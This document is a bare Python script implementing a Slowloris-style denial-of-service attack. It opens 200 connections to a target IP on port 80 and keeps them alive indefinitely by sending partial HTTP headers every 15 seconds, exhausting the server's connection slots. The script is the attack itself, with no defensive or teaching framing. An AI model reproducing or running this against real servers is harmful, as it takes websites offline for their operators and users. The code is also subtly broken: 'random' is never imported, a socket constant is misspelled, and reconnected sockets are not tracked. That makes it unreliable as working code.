import socket
import sys
import time

connections = []
socket_count = 200
ip = sys.argv[1]
port = 80;

headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
"Accept-language: en-US,en,q=0.5"]

# creates and adds all connections to the list
for _ in range(socket_count):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.settimeout(4)
    try:
        conn.connect((ip, port))
    except:
        print("Invalid ip selected")
        sys.exit()
    connections.append(conn)
        
    # setting up connection
    conn.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for h in headers:
        conn.send("{}\r\n".format(h).encode("utf-8"))
  
# sends small packets of information every 15 seconds
while True:
    print("Sending packets...")
    for conn in connections:
        try:
            conn.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
        # if connection dropped, create new one
        except socket.error:
            print("Re-connecting closed socket...")
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREM)
            conn.settimeout(4)
            conn.connect((ip, port))   
            
    time.sleep(15)
